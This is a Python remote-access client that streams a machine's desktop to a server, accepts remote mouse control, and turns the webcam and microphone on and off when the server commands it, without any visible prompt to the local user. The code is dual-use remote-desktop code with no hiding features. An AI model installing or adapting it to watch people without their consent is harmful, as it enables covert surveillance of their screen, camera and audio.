import socket, struct, threading, time
import pyautogui
import numpy as np, cv2, pyaudio
from mss import mss

class RemoteClient:
    def __init__(self, host='127.0.0.1', port=5000):
        self.host = host
        self.port = port
        self.sock = None

        self.mic_on = False
        self.cam_on = False
        self.cursor_on = False

        self.stop_event = threading.Event()
        self.threads = []

    def _shutdown(self):
        self.stop_event.set()
        
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
            self.sock.close()
        except:
            pass

        current_thread = threading.current_thread()
        for t in self.threads:
            if t is not current_thread and t.is_alive():
                t.join(timeout=0.5)

        self.threads.clear()
        self.stop_event.clear()

    def connect(self):
        try:
            if self.sock:
                self._shutdown()

            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5) 
            self.sock.connect((self.host, self.port))
            
            with mss() as sct:
                mon = sct.monitors[1]
                w, h = mon['width'], mon['height']
                self._send(b'R', f"{w},{h}".encode())

            self.threads = [
                threading.Thread(target=self._receive_loop, daemon=True),
                threading.Thread(target=self._stream_desktop, daemon=True)
            ]
            
            for t in self.threads:
                t.start()

        except Exception as e:
            print(f"Connect error: {e}")
            self._shutdown()

    def _send(self, typ: bytes, data: bytes):
        try:
            if self.sock:
                self.sock.sendall(typ + struct.pack('>I', len(data)) + data)
        except:
            self._shutdown()

    def _receive_loop(self):
        try:
            while not self.stop_event.is_set():
                try:
                    hdr = self.sock.recv(1)
                    if not hdr:
                        break
                    length = struct.unpack('>I', self.sock.recv(4))[0]
                    payload = self._recv_all(length)
                    
                    if hdr == b'C':
                        cmd = payload.decode()
                        getattr(self, f"_handle_{cmd.lower()}")()
                    elif hdr == b'M' and self.cursor_on:
                        self._handle_mouse(payload)

                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"Receive error: {e}")
                    break

        except Exception as e:
            print(f"Remote recv error: {e}")
        finally:
            self._shutdown()

    def _recv_all(self, n):
        buf = b''
        while len(buf) < n and not self.stop_event.is_set():
            try:
                packet = self.sock.recv(n - len(buf))
                if not packet:
                    break
                buf += packet
            except:
                break
        return buf

    def _handle_mouse(self, payload):
        try:
            x, y, btn = payload.decode().split(',')
            x = int(x)
            y = int(y)
            
            current_w, current_h = pyautogui.size()
            x = max(0, min(x, current_w - 1))
            y = max(0, min(y, current_h - 1))
            
            pyautogui.moveTo(x, y, duration=0.25)
            pyautogui.click(button=btn.lower())
            
        except Exception as e:
            print(f"Mouse error: {str(e)}")

    def _stream_desktop(self):
        with mss() as sct:
            mon = sct.monitors[1]
            while not self.stop_event.is_set():
                try:
                    img = np.array(sct.grab(mon))
                    _, buf = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                    self._send(b'D', buf.tobytes())
                    time.sleep(1/60)
                except:
                    break

    def _stream_webcam(self):
        cap = cv2.VideoCapture(0)
        while not self.stop_event.is_set() and self.cam_on:
            try:
                ret, frame = cap.read()
                if not ret: continue
                _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                self._send(b'W', buf.tobytes())
                time.sleep(1/15)
            except:
                break
        cap.release()

    def _stream_audio(self):
        pa = pyaudio.PyAudio()
        stream = pa.open(format=pyaudio.paInt16, channels=1, rate=44100,
                         input=True, frames_per_buffer=1024)
        while not self.stop_event.is_set() and self.mic_on:
            try:
                data = stream.read(1024, exception_on_overflow=False)
                self._send(b'A', data)
            except:
                break
        stream.stop_stream()
        stream.close()
        pa.terminate()

    def _handle_mic_on(self):
        if not self.mic_on:
            self.mic_on = True
            t = threading.Thread(target=self._stream_audio, daemon=True)
            t.start()
            self.threads.append(t)

    def _handle_mic_off(self):
        self.mic_on = False

    def _handle_cam_on(self):
        if not self.cam_on:
            self.cam_on = True
            t = threading.Thread(target=self._stream_webcam, daemon=True)
            t.start()
            self.threads.append(t)

    def _handle_cam_off(self):
        self.cam_on = False